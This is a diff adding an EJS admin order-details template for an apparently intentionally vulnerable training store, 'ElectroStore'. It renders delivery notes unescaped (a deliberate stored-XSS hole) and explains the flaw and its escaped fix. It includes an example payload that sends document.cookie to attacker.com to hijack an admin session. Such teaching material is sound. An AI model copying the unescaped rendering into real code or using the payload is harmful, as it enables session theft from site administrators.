@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Order #<%= order.id %> Details - ElectroStore</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <%- include('../partials/header', { user: user, cart: cart }) %>
+
+    <main class="main-content">
+        <div class="container">
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <h1>
+                    <i class="fas fa-file-invoice"></i> Order #<%= order.id %> Details
+                </h1>
+                <div>
+                    <a href="/admin/dashboard" class="btn btn-secondary">
+                        <i class="fas fa-arrow-left"></i> Back to Dashboard
+                    </a>
+                </div>
+            </div>
+
+            <!-- XSS VULNERABILITY WARNING -->
+            <div class="xss-warning">
+                <h4>
+                    <i class="fas fa-exclamation-triangle"></i> CRITICAL SECURITY VULNERABILITY
+                </h4>
+                <p>This page contains a <strong>deliberate XSS vulnerability</strong>. The delivery notes below are rendered using <code><%- %></code> (unescaped output) instead of <code><%= %></code> (escaped output).</p>
+                <p><strong>Vulnerable line:</strong> <code><div class="notes-display"><%- order.delivery_notes %></div></code></p>
+                <p><strong>Impact:</strong> Any script injected into delivery notes will execute when an admin views this page.</p>
+            </div>
+
+            <div class="order-details-card">
+                <!-- Order Information -->
+                <div class="order-info-section">
+                    <h3><i class="fas fa-info-circle"></i> Order Information</h3>
+                    <div class="row" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem;">
+                        <div>
+                            <p><strong>Order ID:</strong> #<%= order.id %></p>
+                            <p><strong>Customer:</strong> <%= order.customer_name %></p>
+                            <p><strong>Order Date:</strong> <%= new Date(order.created_at).toLocaleString() %></p>
+                        </div>
+                        <div>
+                            <p><strong>Status:</strong> 
+                                <span class="status-badge status-<%= order.status.toLowerCase() %>">
+                                    <%= order.status %>
+                                </span>
+                            </p>
+                            <p><strong>Total Items:</strong> <%= order.items.length %></p>
+                            <p><strong>Total Amount:</strong> $<%= order.items.reduce((sum, item) => sum + (item.quantity * item.price_at_time), 0).toFixed(2) %></p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Shipping Address (SAFE - escaped output) -->
+                <div class="order-info-section">
+                    <h3><i class="fas fa-map-marker-alt"></i> Shipping Address</h3>
+                    <div class="address-display">
+                        <%= order.address %>
+                    </div>
+                    <p class="text-muted mt-2">
+                        <i class="fas fa-check-circle"></i> This field uses <code><%= %></code> (escaped output) - safe from XSS
+                    </p>
+                </div>
+
+                <!-- DELIVERY NOTES (VULNERABLE - unescaped output) -->
+                <div class="order-info-section">
+                    <h3>
+                        <i class="fas fa-sticky-note"></i> Delivery Notes
+                        <span class="badge badge-danger" style="background-color: var(--danger-color); color: white; padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem; margin-left: 0.5rem;">
+                            XSS VULNERABLE
+                        </span>
+                    </h3>
+                    <div class="notes-display">
+                        <%- order.delivery_notes %>
+                    </div>
+                    <p class="text-muted mt-2">
+                        <i class="fas fa-exclamation-triangle"></i> 
+                        <strong>VULNERABLE:</strong> This field uses <code><%- %></code> (unescaped output) - allows script execution
+                    </p>
+                </div>
+
+                <!-- Order Items -->
+                <div class="order-info-section">
+                    <h3><i class="fas fa-shopping-cart"></i> Order Items</h3>
+                    <div class="table-responsive">
+                        <table class="table">
+                            <thead>
+                                <tr>
+                                    <th>Product</th>
+                                    <th>Quantity</th>
+                                    <th>Price</th>
+                                    <th>Total</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <% order.items.forEach(item => { %>
+                                    <tr>
+                                        <td>
+                                            <div class="d-flex align-items-center gap-2">
+                                                <div class="cart-item-image">
+                                                    <i class="fas fa-box"></i>
+                                                </div>
+                                                <div>
+                                                    <strong><%= item.product_name %></strong>
+                                                </div>
+                                            </div>
+                                        </td>
+                                        <td><%= item.quantity %></td>
+                                        <td>$<%= item.price_at_time.toFixed(2) %></td>
+                                        <td>$<%= (item.quantity * item.price_at_time).toFixed(2) %></td>
+                                    </tr>
+                                <% }) %>
+                            </tbody>
+                            <tfoot>
+                                <tr>
+                                    <td colspan="3" class="text-end"><strong>Total:</strong></td>
+                                    <td><strong>$<%= order.items.reduce((sum, item) => sum + (item.quantity * item.price_at_time), 0).toFixed(2) %></strong></td>
+                                </tr>
+                            </tfoot>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Status Update -->
+                <div class="order-info-section">
+                    <h3><i class="fas fa-cog"></i> Update Status</h3>
+                    <div class="d-flex gap-2">
+                        <% if (order.status === 'Created') { %>
+                            <form action="/admin/order/<%= order.id %>/status" method="POST">
+                                <input type="hidden" name="status" value="Processing">
+                                <button type="submit" class="btn btn-success">
+                                    <i class="fas fa-play"></i> Mark as Processing
+                                </button>
+                            </form>
+                        <% } else if (order.status === 'Processing') { %>
+                            <form action="/admin/order/<%= order.id %>/status" method="POST">
+                                <input type="hidden" name="status" value="Shipped">
+                                <button type="submit" class="btn btn-success">
+                                    <i class="fas fa-shipping-fast"></i> Mark as Shipped
+                                </button>
+                            </form>
+                        <% } else { %>
+                            <span class="btn btn-secondary" disabled>
+                                <i class="fas fa-check"></i> Order Shipped
+                            </span>
+                        <% } %>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Educational Information -->
+            <div class="card mt-4">
+                <div class="card-header">
+                    <h3 class="card-title">
+                        <i class="fas fa-graduation-cap"></i> XSS Vulnerability Analysis
+                    </h3>
+                </div>
+                <div class="card-body">
+                    <h4>Technical Details:</h4>
+                    <p>The vulnerability occurs because user input (delivery notes) is rendered without proper HTML encoding:</p>
+                    
+                    <div class="code-comparison" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin: 1.5rem 0;">
+                        <div>
+                            <h5><span class="badge badge-danger">VULNERABLE</span></h5>
+                            <pre><code><div class="notes-display">
+  <%- order.delivery_notes %>
+</div></code></pre>
+                            <p><strong>Problem:</strong> <code><%- %></code> outputs raw HTML, allowing script execution.</p>
+                        </div>
+                        <div>
+                            <h5><span class="badge badge-success">SAFE</span></h5>
+                            <pre><code><div class="notes-display">
+  <%= order.delivery_notes %>
+</div></code></pre>
+                            <p><strong>Solution:</strong> <code><%= %></code> encodes HTML entities, preventing XSS.</p>
+                        </div>
+                    </div>
+
+                    <h4>Example Attack Scenario:</h4>
+                    <ol>
+                        <li>Attacker creates account and places order with malicious delivery notes:
+                            <pre><code><script>
+  fetch('http://attacker.com/steal?cookie=' + document.cookie);
+</script></code></pre>
+                        </li>
+                        <li>Admin views order details (or admin bot automatically visits)</li>
+                        <li>Script executes in admin context, stealing session cookie</li>
+                        <li>Attacker receives cookie and can hijack admin session</li>
+                    </ol>
+
+                    <div class="security-warning mt-3">
+                        <i class="fas fa-shield-alt"></i>
+                        <strong>Prevention:</strong> Always use proper output encoding (<code><%= %></code> in EJS), 
+                        validate and sanitize user input, implement Content Security Policy (CSP), and use secure coding practices.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <%- include('../partials/footer') %>
+
+    <script src="/js/main.js"></script>
+    <script>
+    // This script demonstrates that scripts in delivery notes will execute
+    console.log('Order details page loaded. Any XSS payload in delivery notes will execute now.');
+    console.log('Delivery notes content:', `<%= order.delivery_notes %>`);
+    </script>
+</body>
+</html>
